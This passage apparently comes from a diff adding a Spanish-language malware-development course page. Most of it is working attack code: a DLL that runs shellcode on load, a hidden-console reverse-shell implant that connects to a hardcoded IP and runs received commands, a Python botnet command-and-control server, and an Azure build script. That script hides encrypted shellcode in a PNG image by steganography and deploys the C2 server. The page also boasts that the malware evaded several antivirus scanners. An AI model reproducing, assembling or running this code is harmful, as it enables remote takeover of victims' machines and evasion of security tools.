+retval = VirtualProtect(alloc_mem, lengthOfshellcodePayload, PAGE_EXECUTE_READ, &amp;oldprotect);
+
+if ( retval != 0 ) {
+    threadHandle = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) alloc_mem, 0, 0, 0);
+    WaitForSingleObject(threadHandle, 0);
+}
+return 0;</code></pre>
+<p>}</p>
+<p>BOOL WINAPI DllMain( HINSTANCE hinstDLL, DWORD reasonForCall, LPVOID lpReserved ) {</p>
+<pre><code>switch ( reasonForCall ) {
+case DLL_PROCESS_ATTACH:
+    RunShellcode();
+    break;
+case DLL_THREAD_ATTACH:
+    break;
+case DLL_THREAD_DETACH:
+    break;
+case DLL_PROCESS_DETACH:
+    break;
+}
+return TRUE;</code></pre>
+<p>}</p>
+<pre><code>
+Listo!! Hora de compilar nuestro dll. En la ponencia el proceso fue realizado desde un SO Windows en donde se requiere los Native Tools instalados (x64 native tools command prompt for VS 2022) junto con los siguientes scripts :
+
+- Script PoC-maldev/compile.sh : Script de compiladoción para Linux (Bash)
+```bash
+#!/bin/bash
+
+x86_64-w64-mingw32-g++ -shared -o evildll.dll evildll.def evildll.cpp
+x86_64-w64-mingw32-g++ -o dllinjector dllinjector.cpp -lurlmon -lwininet -Wl,--subsystem,windows</code></pre>
+<ul>
+<li>Script PoC-maldev/compile.bat : Script de compiladoción para Windows 
+<pre><code class="language-bat">
+@ECHO OFF</code></pre></li>
+</ul>
+<p>cl.exe /O2 /D_USRDLL /D_WINDLL evildll.cpp evildll.def /MT /link /DLL /OUT:evildll.dll
+cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tp dllinjector.cpp /link /OUT:dllinjector.exe /SUBSYSTEM:WINDOWS /MACHINE:x64</p>
+<pre><code>
+    Esto creara los archivos dllinjector.exe &amp; evil.dll
+
+- Generación de shellcode payload a partir del dllinjector.exe con [Donut](https://github.com/TheWover/donut) y [Wine](https://www.winehq.org/)
+
+  - Instalacion de Donut
+```bash
+wget https://github.com/TheWover/donut/releases/download/v0.9.3/donut_v0.9.3.zip -O PoC-maldev/donut.zip
+unzip PoC-maldev/donut.zip -p donut.exe &gt; donut.exe
+rm PoC-maldev/donut.zip</code></pre>
+<ul>
+<li>
+<p>Ejecucion en Linux</p>
+<pre><code class="language-bash">wine donut.exe -e 1 -b 1 -o dllinjector.bin -t dllinjector.exe</code></pre>
+</li>
+<li>
+<p>Ejecucion en Alpine</p>
+<pre><code class="language-bash">wine64 donut.exe -e 1 -b 1 -o dllinjector.bin -t dllinjector.exe</code></pre>
+</li>
+</ul>
+<p>Dudas? ... Unete a la <a href="https://t.me/Ivam3by_Cinderella/22">charla</a> en nuestro <a href="https://t.me/Ivam3by_Cinderella">Chat de Telegram</a></p>
+<pre><code>Asiste a la [Tercera Parte](https://t.me/Ivam3byCinderella?livestream) de la ponencia en el [canal de Telegram](https://t.me/Ivam3byCinderella) de la comunidad.</code></pre>
+<ol start="4">
+<li>Servidor de Comando y Control (server2.py) e implante final (implant.exe): Las 3 etapas principales del malware PoC que se cubrieron en las primeras 2 clases del curso van a permitir injectar nuestro implante final (implant.exe) que nos va a permitir ejecutar comandos y tomar control desde nuestro servidor de Comando y Control (server2.py) alojado en la nube de <a href="https://portal.azure.com">Azure</a> en una instancia de máquina virtual Ubuntu 20.04 LTS. Para ello en esta última 3ra clase se cubre la programación del implante y consecutiva generación de su shellcode correspondiente, la programación del servidor y la creación de nuestro servidor en la nube. </li>
+</ol>
+<ul>
+<li>Script PoC-maldev/implant.cpp
+<pre><code class="language-cpp">
+//C++ Headers
+#include &lt;winsock2.h&gt; //Socket Header
+#include &lt;windows.h&gt; //Win API Header
+#include &lt;ws2tcpip.h&gt; //TCP-IP Header</code></pre></li>
+</ul>
+<p>//C Header</p>
+<h1>include <stdio.h> //Input Output Header</h1>
+<h1>pragma comment(lib, &quot;user32.lib&quot;)</h1>
+<h1>pragma comment(lib, &quot;Advapi32.lib&quot;)</h1>
+<h1>pragma comment(lib, &quot;Shell32.lib&quot;)</h1>
+<h1>pragma comment(lib, &quot;Ws2_32.lib&quot;)</h1>
+<h1>define DEFAULT_BUFLEN 1024</h1>
+<p>void RevShell(void);</p>
+<p>void exec(char <em>, char </em>);</p>
+<p>void whoami(char *);</p>
+<p>void hostname(char *);</p>
+<p>void pwd(char *);</p>
+<p>int main() {</p>
+<pre><code>HWND stealth; //Declare a window handle
+AllocConsole(); //Allocate a new console
+stealth = FindWindowA("ConsoleWindowClass", NULL); //Find the previous Window handler and hide/show the window depending upon the next command
+ShowWindow(stealth, SW_HIDE); //SW_SHOWNORMAL = 1 = show, SW_HIDE = 0 = Hide the console
+RevShell();
+
+return 0;</code></pre>
+<p>}</p>
+<p>void RevShell() {</p>
+<pre><code>WSADATA wsaver;
+WSAStartup(MAKEWORD(2, 2), &amp;wsaver);
+SOCKET tcpsock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+sockaddr_in addr;
+addr.sin_family = AF_INET;
+addr.sin_addr.s_addr = inet_addr("172.174.142.1");
+addr.sin_port = htons(443);
+
+if (connect(tcpsock, (SOCKADDR *) &amp;addr, sizeof(addr)) == SOCKET_ERROR) {
+    closesocket(tcpsock);
+    WSACleanup();
+    exit(0);
+}
+else {
+    char CommandReceived[DEFAULT_BUFLEN] = "";
+    while (true) {
+        int Result = recv(tcpsock, CommandReceived, DEFAULT_BUFLEN, 0);
+        if ((strcmp(CommandReceived, "whoami") == 0)) {
+            char buffer[257] = "";
+            whoami(buffer);
+            strcat(buffer, "\n");
+            send(tcpsock, buffer, strlen(buffer) + 1, 0);
+            memset(buffer, 0, sizeof(buffer));
+        }
+        else if ((strcmp(CommandReceived, "hostname") == 0)) {
+            char buffer[257] = "";
+            hostname(buffer);
+            strcat(buffer, "\n");
+            send(tcpsock, buffer, strlen(buffer) + 1, 0);
+            memset(buffer, 0, sizeof(buffer));
+        }
+        else if ((strcmp(CommandReceived, "pwd") == 0)) {
+            char buffer[257] = "";
+            pwd(buffer);
+            strcat(buffer, "\n");
+            send(tcpsock, buffer, strlen(buffer) + 1, 0);
+            memset(buffer, 0, sizeof(buffer));
+        }
+        else if ((strcmp(CommandReceived, "exit") == 0)) {
+            closesocket(tcpsock);
+            WSACleanup();
+            exit(0);
+        }
+        else {
+            char splitval[DEFAULT_BUFLEN] = "";
+            for (int i = 0; i &lt; (*(&amp;CommandReceived + 1) - CommandReceived); i++) {
+                if (CommandReceived[i] == *" ") {
+                    break;
+                }
+                else {
+                    splitval[i] = CommandReceived[i];
+                }
+            }
+            if ((strcmp(splitval, "exec") == 0)) {
+                char CommandExec[DEFAULT_BUFLEN] = "";
+                int j = 0;
+                for (int i = 5; i &lt; (*(&amp;CommandReceived + 1) - CommandReceived); i++) {
+                    CommandExec[j] = CommandReceived[i];
+                    ++j;
+                }
+                char buffer[257] = "";
+                exec(buffer, CommandExec);
+                strcat(buffer, "\n");
+                send(tcpsock, buffer, strlen(buffer) + 1, 0);
+                memset(buffer, 0, sizeof(buffer));
+            }
+            else {
+                char buffer[20] = "Invalid command\n";
+                send(tcpsock, buffer, strlen(buffer) + 1, 0);
+                memset(buffer, 0, sizeof(buffer));
+            }
+        }
+        memset(CommandReceived, 0, sizeof(CommandReceived));
+    }
+}</code></pre>
+<p>}</p>
+<p>void exec(char <em> returnval, char </em> fileexec) {
+if (32 &gt;= (INT_PTR) ShellExecute(NULL, &quot;open&quot;, fileexec, NULL, NULL, SW_SHOWNORMAL)) {
+strcat(returnval, &quot;[x] Error executing command...\n&quot;);
+}
+else {
+strcat(returnval, &quot;\n&quot;);
+}
+}</p>
+<p>void whoami(char * returnval) {
+DWORD bufferlen = 257;
+GetUserName(returnval, &amp;bufferlen);
+}</p>
+<p>void hostname(char * returnval) {
+DWORD bufferlen = 257;
+GetComputerName(returnval, &amp;bufferlen);
+}</p>
+<p>void pwd(char * returnval) {
+TCHAR tempvar[MAX_PATH];
+GetCurrentDirectory(MAX_PATH, tempvar);
+strcat(returnval, tempvar);
+}</p>
+<pre><code>
+- Script PoC-maldev/server2.py
+```python
+#!/usr/bin/python3
+
+import socket
+import sys
+import os
+import threading
+import queue
+import time
+
+q = queue.Queue()
+Socketthread = []
+ClientList = {}
+
+class BotHandler(threading.Thread):
+    def __init__(self, client, client_address, qv):
+        threading.Thread.__init__(self)
+        self.client = client
+        self.client_address = client_address
+        self.ip = client_address[0]
+        self.port = client_address[1]
+        self.q = qv
+
+    def run(self):
+        BotName = threading.current_thread().name
+        print(f"\n[*] Slave {self.ip}:{self.port} connected with Thread-ID: {BotName}")
+        ClientList[BotName] = self.client_address
+        while True:
+            RecvBotCmd = self.q.get()
+            try:
+                self.client.send(RecvBotCmd.encode('latin-1'))
+                recvVal = (self.client.recv(1024)).decode('latin-1')
+                print(recvVal)
+            except Exception as e:
+                print(e)
+                break
+
+class BotCmd(threading.Thread):
+    def __init__(self, qv2):
+        threading.Thread.__init__(self)
+        self.q = qv2
+
+    def run(self):
+        while True:
+            SendCmd = str(input("BotCmd&gt; "))
+            if SendCmd == "":
+                pass
+            elif SendCmd == "exit":
+                for i in range(len(Socketthread)):
+                    time.sleep(0.1)
+                    self.q.put(SendCmd)
+                time.sleep(5)
+                os._exit(0)
+            else:
+                print(f"[+] Sending command: {SendCmd} to {str(len(Socketthread))} bots")
+                for i in range(len(Socketthread)):
+                    time.sleep(0.1)
+                    self.q.put(SendCmd)
+
+def listener(lhost, lport, q):
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    server_address = (lhost, lport)
+    server.bind(server_address)
+    server.listen(100)
+
+    print(f"[+] Startring Botnet listener on tcp: {lhost}:{lport}\n")
+    BotCmdThread = BotCmd(q)
+    BotCmdThread.start()
+    while True:
+        (client, client_address) = server.accept()
+        newthread = BotHandler(client, client_address, q)
+        Socketthread.append(newthread)
+        newthread.start()
+
+def main():
+
+    if (len(sys.argv) &lt; 3):
+        print(f"""
+[!] Usage:
+[+] python3 {sys.argv[0]} &lt;LHOST&gt; &lt;LPORT&gt;
+[+] Eg.: python3 {sys.argv[0]} 127.0.0.1 8080
+""")
+    else:
+        try:
+            lhost = sys.argv[1]
+            lport = int(sys.argv[2])
+            listener(lhost, lport, q)
+        except Exception as e:
+            print(f"\n[-] Unable to run the handler. Reason: {e}\n")
+
+if __name__ == "__main__":
+    main()</code></pre>
+<ul>
+<li>Script PoC-maldev/build.sh
+<pre><code class="language-bash">
+#!/bin/bash</code></pre></li>
+</ul>
+<p>echo &quot;[+] Creating CrashCourseMaldev resource group...&quot;
+az group create --name CrashCourseMaldev --location eastus &gt; /dev/null 2&gt;&amp;1
+echo &quot;[+] CrashCourseMaldev resource group successfully created&quot;</p>
+<p>echo &quot;[+] Creating C2 instance...&quot;
+user=$(whoami | sed 's/\n//g')
+c2ip=$(az vm create \
+--resource-group CrashCourseMaldev \
+--name c2 \
+--image Canonical:0001-com-ubuntu-server-focal:20_04-lts-gen2:latest \
+--size Standard_B2s \
+--zone 1 \
+--admin-username $user \
+--generate-ssh-keys \
+--nsg c2-nsg \
+--public-ip-address c2-ip \
+--public-ip-address-allocation static \
+--public-ip-sku Standard \
+--storage-sku Standard_LRS \
+--only-show-errors \
+| grep publicIpAddres | awk -F': ' '{print $2}' | sed 's/[&quot;]//g' | sed 's/,//g')
+echo &quot;[+] C2 instance successfully created&quot;
+echo &quot;[+] C2 IP address: $c2ip&quot;</p>
+<p>echo &quot;[+] Adding network security group rules...&quot;
+bmip=$(curl -s whatismyip.akamai.com | sed 's/\n//g')
+az network nsg rule create \
+--resource-group CrashCourseMaldev \
+--nsg-name c2-nsg \
+--name AllowC2Connection1 \
+--access Allow \
+--protocol Tcp \
+--direction Inbound \
+--priority 320 \
+--source-address-prefix $bmip \
+--source-port-range &quot;*&quot; \
+--destination-port-ranges 4444 &gt; /dev/null 2&gt;&amp;1
+echo &quot;[+] Inbound rule for port 4444 added to c2-nsg&quot;</p>
+<p>az network nsg rule create \
+--resource-group CrashCourseMaldev \
+--nsg-name c2-nsg \
+--name AllowC2Connection2 \
+--access Allow \
+--protocol Tcp \
+--direction Inbound \
+--priority 330 \
+--source-address-prefix $bmip \
+--source-port-range &quot;*&quot; \
+--destination-port-ranges 80 &gt; /dev/null 2&gt;&amp;1
+echo &quot;[+] Inbound rule for port 80 added to c2-nsg&quot;</p>
+<p>az network nsg rule create \
+--resource-group CrashCourseMaldev \
+--nsg-name c2-nsg \
+--name AllowC2Connection3 \
+--access Allow \
+--protocol Tcp \
+--direction Inbound \
+--priority 340 \
+--source-address-prefix $bmip \
+--source-port-range &quot;*&quot; \
+--destination-port-ranges 443 &gt; /dev/null 2&gt;&amp;1
+echo &quot;[+] Inbound rule for port 443 added to c2-nsg&quot;</p>
+<p>echo &quot;[+] Compiling implant.exe...&quot;
+sed -i &quot;s/inet_addr(\&quot;[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\&quot;)/inet_addr(\&quot;$c2ip\&quot;)/&quot; Part3/implant.cpp
+x86_64-w64-mingw32-g++ -o Part3/implant Part3/implant.cpp -lwsock32 -lws2_32</p>
+<p>echo &quot;[+] Generating implant.c shellcode...&quot;
+export WINEDEBUG=fixme-all
+wine donut.exe -b 1 -o Shellcodes/implant.c -f 3 -t Part3/implant.exe &gt; /dev/null 2&gt;&amp;1
+sed -i 's/buf/shellcodePayload/' Shellcodes/implant.c
+sed -i 's/^.<em>unsigned char shellcodePayload[] =.</em>$//g' Part2/evildll.cpp
+sed -i '/\x[a-f0-9]{2}/d' Part2/evildll.cpp
+sed -i '6 r Shellcodes/implant.c' Part2/evildll.cpp</p>
+<p>echo &quot;[+] Compiling dllinjector.exe and evildll.dll...&quot;
+sed -i &quot;s/\(http:\/\/)[0-9]\{1,3}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\(:80\/.*\)/\1$c2ip\2/&quot; Part2/dllinjector.cpp
+x86_64-w64-mingw32-g++ -shared -o Part2/evildll.dll Part2/evildll.def Part2/evildll.cpp
+x86_64-w64-mingw32-g++ -o Part2/dllinjector Part2/dllinjector.cpp -Wno-all -lurlmon -lwininet -Wl,--subsystem,windows</p>
+<p>echo &quot;[+] Generating dllinjector.bin shellcode...&quot;
+wine donut.exe -e 1 -b 1 -o Shellcodes/dllinjector.bin -t Part2/dllinjector.exe &gt; /dev/null 2&gt;&amp;1</p>
+<p>echo &quot;[+] Encrypting dllinjector.bin shellcode...&quot;
+python3 Scripts/xor.py Shellcodes/dllinjector.bin
+mv encrypted.bin Shellcodes/dllinjectorencrypted.bin</p>
+<p>echo &quot;[+] Injecting dllinjectorencrypted.bin into pornhub.png...&quot;
+python3 Scripts/lsb.py -hide Part1/pornhub.png Shellcodes/dllinjectorencrypted.bin Part1/pornhublsb.png &gt; /dev/null 2&gt;&amp;1</p>
+<p>echo &quot;[+] Compiling trojan.exe...&quot;
+sed -i &quot;s/inet_addr(\&quot;[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\&quot;)/inet_addr(\&quot;$c2ip\&quot;)/&quot; Part1/trojan.cpp
+x86_64-w64-mingw32-windres -o Part1/resources.o Part1/resources.rc
+x86_64-w64-mingw32-g++ -o Part1/trojan Part1/trojan.cpp -lwsock32 -lws2_32 -Wl,--subsystem,windows Part1/resources.o</p>
+<p>echo &quot;[+] Ziping resources into Test.zip ...&quot;
+zip -r Test.zip Part1/trojan.exe Part2/evildll.dll Servers</p>
+<p>echo &quot;[+] Sending setup.sh and Test.zip to C2...&quot;
+sed -i &quot;s/\&quot;[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\&quot;/\&quot;$bmip\&quot;/&quot; setup.sh
+sed -i &quot;s/user/$user/&quot; setup.sh
+yes|scp -o &quot;UserKnownHostsFile=/dev/null&quot; -o &quot;StrictHostKeyChecking=no&quot; setup.sh $user@$c2ip:/home/$user/setup.sh &gt; /dev/null 2&gt;&amp;1
+yes|scp -o &quot;UserKnownHostsFile=/dev/null&quot; -o &quot;StrictHostKeyChecking=no&quot; Test.zip $user@$c2ip:/home/$user/Test.zip &gt; /dev/null 2&gt;&amp;1</p>
+<p>echo &quot;[+] Setting up C2 server...&quot;
+yes|ssh -o &quot;UserKnownHostsFile=/dev/null&quot; -o &quot;StrictHostKeyChecking=no&quot; $user@$c2ip &quot;chmod +x /home/$user/setup.sh &amp;&amp; bash /home/$user/setup.sh&quot; &gt; /dev/null 2&gt;&amp;1</p>
+<p>echo &quot;[+] Done!&quot;
+echo &quot;[+] Connect with: ssh -o 'UserKnownHostsFile=/dev/null' -o 'StrictHostKeyChecking=no' $user@$c2ip&quot;</p>
+<pre><code>
+- Script PoC-maldev/setup.sh
+```bash
+#!/bin/bash
+
+ip="192.168.100.20"
+user=$(whoami | sed 's/\n//g')
+sudo apt-get update &amp;&amp; sudo apt-get full-upgrade -y &amp;&amp; sudo apt-get install python3-pip unzip -y
+echo "export PATH=/home/$user/.local/bin:$PATH" &gt;&gt; /home/$user/.bashrc
+python3 -m pip install --upgrade pip
+python3 -m pip install Pillow numpy
+unzip Test.zip &amp;&amp; rm Test.zip
+gcc -o Servers/server2 Servers/server.c
+sudo ufw allow from $ip proto tcp to any port 22
+sudo ufw allow from $ip proto tcp to any port 80
+sudo ufw allow from $ip proto tcp to any port 443
+sudo ufw allow from $ip proto tcp to any port 4444
+yes|sudo ufw enable</code></pre>
+<ul>
+<li>Script PoC-maldev/rmrsrc.sh
+<pre><code class="language-bash">
+#!/bin/bash</code></pre></li>
+</ul>
+<p>echo &quot;Deleting CrashCourseMaldev resource group...&quot;
+az group delete --name CrashCourseMaldev --yes --verbose
+echo &quot;Deleting NetworkWatcherRG resource group...&quot;
+az group delete --name NetworkWatcherRG --yes --verbose
+echo &quot;Deleting DefaultResourceGroup-EUS resource group...&quot;
+az group delete --name DefaultResourceGroup-EUS --yes --verbose
+echo &quot;Deleting all generated files&quot;
+rm Part1/{pornhublsb.png,resources.o,trojan.exe} Part2/{dllinjector.exe,evildll.dll} Part3/client.exe Shellcodes/* Test.zip
+rm $HOME/.ssh/{id_rsa,id_rsa.pub}</p>
+<pre><code>
+
+Escaneo de malware sin ser detectado en Diciembre del 2022 en :
+- [AntiScanMe](https://antiscan.me)
+- [Windows Defender](https://www.microsoft.com/es-mx/windows/comprehensive-security)
+- [VirusTotal](https://www.virustotal.com)
+- [Kaspersky](https://latam.kaspersky.com/)
+
+Dudas? ... Unete a la [charla](https://t.me/Ivam3by_Cinderella/22) en nuestro [Chat de Telegram](https://t.me/Ivam3by_Cinderella)
+
+Apoyate con el video de la ponencia que encontraras en la sección de 'Cursos Hacking' del [BOT de la comunidad](https://t.me/Ivam3_Bot) al adquirir tu [membresia](https://www.youtube.com/ivam3bycinderella/join).</code></pre>
